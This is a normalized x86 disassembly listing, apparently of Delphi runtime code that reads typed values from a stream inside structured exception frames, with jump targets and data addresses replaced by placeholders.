mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x14 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x6a ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x14 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov ecx ebx
mov eax [ esi + 0x6c ]
call [ esi + 0x68 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax ebx
call [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] eax
mov eax [ ebp + 0x8 ]
test [ eax - 0x9 ] 0x4
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
xor eax eax
push ebp
push sub_41bdce
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax + 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or edx 0xffffffff
mov ebx [ eax ]
call [ ebx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x200
sub_41bdff
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
call sub_41bcb4
pop ecx
test al al
jne r-xdata
call sub_403974
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_403920
sub_41be24
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_41be9c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0x2c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov si 0xfff8
call sub_403368
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x1c ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x14 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
test [ eax + 0x1c ] 0x10
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
call sub_4179e0
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x14 ]
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x200
sub_41bea1
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
call sub_41bcb4
pop ecx
test al al
jne r-xdata
call sub_403974
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_403920
sub_41bec4
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_41bf3f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_41d884
mov ecx eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x1c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov si 0xfff2
call sub_403368
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov [ eax + 0x2c ] ebx
mov eax [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0x2c ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
sub_41bf44
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
call sub_41bcb4
pop ecx
test al al
jne r-xdata
call sub_403974
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_403920
sub_41bf68
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41c189
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x20 ]
lea edx [ ebp - 0x9 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x8 ]
call sub_41d214
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
call sub_41d214
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2c ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x1c ]
mov [ ebp - 0x28 ] eax
xor eax eax
push ebp
push sub_41c159
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
test [ ebp - 0x9 ] 0x1
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x28 ]
mov [ eax + 0x1c ] edx
retn
xor eax eax
push ebp
push sub_41c117
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov eax [ ebp - 0x14 ]
call sub_41bbb4
pop ecx
mov eax [ ebp - 0x14 ]
or [ eax + 0x1c ] 0x1
push ebp
mov dl 0x1
mov ax [ r-xdata ]
call sub_41bc2c
pop ecx
test [ ebp - 0x9 ] 0x1
jne r-xdata
push ebp
call sub_41bd14
pop ecx
push ebp
call sub_41bec4
pop ecx
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
push ebp
call sub_41be24
pop ecx
mov eax [ ebp - 0x14 ]
test [ eax + 0x1d ] 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
call sub_4039a4
jmp r-xdata
mov eax [ ebp - 0x14 ]
or [ eax + 0x1c ] 0x2
push ebp
mov dl 0x1
mov ax [ r-xdata ]
call sub_41bc2c
pop ecx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp - 0x14 ]
and [ eax + 0x1c ] 0xfffd
push ebp
xor edx edx
mov ax [ r-xdata ]
call sub_41bc2c
pop ecx
test [ ebp - 0x9 ] 0x2
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x14 ]
mov [ eax + 0x1c ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c190
lea eax [ ebp - 0x1c ]
mov edx 0x2
call sub_403f64
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_405224
retn
test [ ebp - 0x9 ] 0x1
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2c ]
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x14 ]
mov si 0xfff9
call sub_403368
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_417ef0
test eax eax
jge r-xdata
mov eax [ ebp - 0x14 ]
test [ eax + 0x1d ] 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
push ebp
mov eax [ ebp - 0x14 ]
call sub_41bb78
pop ecx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_417d38
jmp r-xdata
push ebp
mov eax [ ebp - 0x14 ]
call sub_41bb78
pop ecx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_417d38
sub_41c11c
push ebp
call sub_41bc94
pop ecx
test al al
je r-xdata
call sub_403920
call sub_403974
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x28 ]
mov [ eax + 0x1c ] edx
retn
mov eax [ ebp - 0x14 ]
call sub_40316c
sub_41c1a4
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41c214
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov edx [ ebp - 0x4 ]
mov [ edx + 0x30 ] eax
xor eax eax
push ebp
push sub_41c1ff
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41c214
mov eax [ ebp - 0x4 ]
call sub_41b764
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41b8a8
retn
sub_41c214
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41b64c
test al al
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41c71c
mov eax [ ebp - 0x4 ]
call sub_41c5b8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ ebp - 0xc ] eax
mov eax ebx
mov si 0xfffb
call sub_403368
mov edx [ ebp - 0x4 ]
mov [ edx + 0x2c ] eax
xor eax eax
push ebp
push sub_41c2d6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov si 0xfffc
call sub_403368
mov edi eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28 ] edi
test edi edi
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41b64c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_41bf68
mov eax [ ebp - 0x4 ]
call sub_41c5b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c2dd
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x28 ] edx
retn
sub_41c2e4
push ebx
add esp 0xffffffec
mov ebx eax
mov eax ebx
call sub_41d3f0
cmp al 0x5
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_41c56c
mov [ esp + 0xc ] eax
mov [ esp + 0x10 ] edx
fild [ esp + 0xc ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0xa
mov eax ebx
call sub_41b9b4
jmp r-xdata
fld [ esp ]
add esp 0x14
pop ebx
retn
sub_41c328
push ebx
add esp 0xfffffff4
mov ebx eax
mov eax ebx
call sub_41d3f0
cmp al 0xf
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_41c56c
mov [ esp + 0x4 ] eax
mov [ esp + 0x8 ] edx
fild [ esp + 0x4 ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41b9b4
jmp r-xdata
fld [ esp ]
add esp 0xc
pop ebx
retn
sub_41c36c
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_41d3f0
cmp al 0x10
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_41c56c
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_41b9b4
jmp r-xdata
fild [ esp ]
add esp 0x10
pop ebx
retn
sub_41c3bc
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_41d3f0
cmp al 0x11
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_41c56c
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_41b9b4
jmp r-xdata
fld [ esp ]
add esp 0x10
pop ebx
retn
sub_41c400
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_41d3f0
and eax 0x7f
cmp eax 0xd
ja r-xdata
call sub_41b48c
mov al [ eax + lookup_table_41c427 ]
jmp [ eax * 4 + jump_table_41c435 ]
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_41b9b4
xor ecx ecx
mov cl [ esp ]
mov eax esi
xor edx edx
call sub_404030
mov eax esi
call j_sub_40440c
mov edx eax
xor ecx ecx
mov cl [ esp ]
mov eax ebx
call sub_41b9b4
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_403f94
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_403f94
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_403f94
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_403f94
jmp r-xdata
pop edx
pop esi
pop ebx
retn
sub_41c500
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_41d3f0
sub al 0x2
je r-xdata
lea edx [ esp + 0x4 ]
mov ecx 0x1
mov eax ebx
call sub_41b9b4
movsx eax [ esp + 0x4 ]
mov [ esp ] eax
jmp r-xdata
dec al
je r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop ebx
retn
lea edx [ esp + 0x6 ]
mov ecx 0x2
mov eax ebx
call sub_41b9b4
movsx eax [ esp + 0x6 ]
mov [ esp ] eax
jmp r-xdata
dec al
je r-xdata
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41b9b4
jmp r-xdata
jmp r-xdata
call sub_41b48c
sub_41c56c
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_41b990
cmp al 0x13
jne r-xdata
mov eax ebx
call sub_41c500
cdq
mov [ esp ] eax
mov [ esp + 0x4 ] edx
mov eax ebx
call sub_41d3f0
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_41b9b4
jmp r-xdata
mov eax [ esp ]
mov edx [ esp + 0x4 ]
pop ecx
pop edx
pop ebx
retn
sub_41c5c0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov al [ r-xdata ]
mov [ esi ] al
mov eax ebx
call sub_41b990
and al 0xf0
cmp al 0xf0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_41d3f0
and al 0xf
mov [ esi ] al
test [ esi ] 0x2
je r-xdata
mov eax ebx
call sub_41c500
mov [ edi ] eax
sub_41c600
push ebp
mov ebp esp
add esp 0xfffffedc
push ebx
xor edx edx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41c6f1
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_403f40
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x8 ]
call sub_403fd8
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x124 ] eax
mov [ ebp - 0x120 ] 0xb
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x11c ] eax
mov [ ebp - 0x118 ] 0xb
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov [ ebp - 0x114 ] eax
mov [ ebp - 0x110 ] 0xb
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x124 ]
push eax
push 0x3
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bac4
call sub_4038f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c6f8
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
lea edx [ ebp - 0x104 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
call sub_4030bc
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_4041a4
sub_41c71c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41c8ec
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
push ebp
push sub_41c8a1
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_41d214
xor edx edx
push ebp
push sub_41c87a
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx 0x1
mov eax [ ebp - 0x8 ]
call sub_404200
mov esi eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x1
cmp esi ebx
jl r-xdata
mov eax [ ebp - 0xc ]
add eax 0x70
push eax
mov ecx ebx
sub ecx edi
mov edx edi
mov eax [ ebp - 0x8 ]
call sub_404460
cmp esi ebx
jl r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + ebx - 0x1 ] 0x2e
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_4033ac
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x70 ]
call sub_41499c
mov edi eax
test edi edi
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_4033ac
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x70 ]
call sub_41499c
mov edi eax
test edi edi
jne r-xdata
inc ebx
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x0
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x1
mov eax [ ebp - 0xc ]
cmp [ eax + 0x70 ] 0x0
je r-xdata
mov ecx edi
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_41caa0
jmp r-xdata
xor eax eax
mov [ ebp - 0x14 ] eax
mov eax [ edi ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x70 ]
mov eax [ ebp - 0xc ]
call sub_41b9a0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x70 ]
mov eax [ ebp - 0xc ]
call sub_41b9a0
mov eax [ ebp - 0x14 ]
mov edx [ r-xdata ]
call sub_4032f8
test al al
jne r-xdata
mov edx edi
mov eax [ ebp - 0x10 ]
call sub_414a60
mov [ ebp - 0x14 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
inc ebx
jmp r-xdata
push ebp
call sub_41c700
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c8f3
lea eax [ ebp - 0x8 ]
call sub_403f40
retn
mov edi ebx
jmp r-xdata
sub_41c8b4
mov eax [ ebp - 0xc ]
cmp [ eax + 0x78 ] 0x0
je r-xdata
call sub_403920
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
test al al
jne r-xdata
call sub_403974
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c8f3
lea eax [ ebp - 0x8 ]
call sub_403f40
retn
sub_41c8fc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ esi ]
mov eax [ eax ]
call sub_417888
mov ebx eax
test ebx ebx
je r-xdata
call sub_41b48c
lea edx [ ebp - 0x8 ]
mov eax edi
call ebx
test al al
je r-xdata
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_414ad4
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41c944
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
push eax
push esi
push 0x0
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_41af20
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_417d38
pop edi
pop esi
pop ebx
pop ebp
retn
sub_41c984
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
xor eax eax
push ebp
push sub_41c9d3
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41db08
lea ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_414f70
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c9da
lea eax [ ebp - 0x10 ]
call sub_40f0a8
retn
sub_41c9e0
push ebp
mov ebp esp
push 0x0
push 0x0
xor eax eax
push ebp
push sub_41ca92
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41b990
cmp al 0xd
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41c400
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41af20
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_417d38
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41d3f0
lea eax [ ebp - 0x4 ]
call sub_4058d0
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ ebp - 0x4 ]
call sub_415024
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ca99
lea eax [ ebp - 0x8 ]
call sub_403f40
lea eax [ ebp - 0x4 ]
call sub_4058d0
retn
sub_41caa0
push ebp
mov ebp esp
push ecx
mov ecx 0x5
push 0x0
push 0x0
dec ecx
jne r-xdata
xchg [ ebp - 0x4 ] ecx
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41cd9b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov ebx [ eax ]
xor eax eax
mov al [ ebx ]
cmp eax 0x10
ja r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41cda2
lea eax [ ebp - 0x2c ]
mov edx 0x2
call sub_403f64
lea eax [ ebp - 0x24 ]
call sub_404620
lea eax [ ebp - 0x20 ]
mov edx 0x3
call sub_403f64
retn
jmp [ eax * 4 + jump_table_41cb30 ]
mov eax [ rw-data ]
call sub_41b474
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_414a60
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41b990
cmp al 0x7
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41ba50
xor ecx ecx
mov cl al
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_414ad4
jmp r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_41c400
mov edx [ ebp - 0x1c ]
mov eax ebx
call sub_414938
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_414ad4
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c2e4
add esp 0xfffffff4
fstp [ esp ]
fwait
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_414d64
jmp r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_41d250
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_414c64
jmp r-xdata
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_41d30c
mov ecx [ ebp - 0x24 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_414c90
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41d134
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_414ad4
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41b990
sub al 0xd
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41b990
cmp al 0xd
jne r-xdata
push ebp
call sub_41c984
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c56c
push edx
push eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_414fe8
jmp r-xdata
push ebp
call sub_41c9e0
pop ecx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_414a60
test [ eax + 0x24 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c500
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_414ad4
jmp r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_41c400
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41c8fc
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d3f0
xor ecx ecx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_414ad4
jmp r-xdata
dec al
je r-xdata
lea edx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
call sub_41c400
mov ecx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d3f0
mov ecx rw-data
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_414fb0
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d3f0
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_414a60
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_41baa8
jmp r-xdata
jmp r-xdata
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_414fb0
jmp r-xdata
push ebp
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_41c400
mov ecx [ ebp - 0x28 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41c944
pop ecx
jmp r-xdata
sub_41cda8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
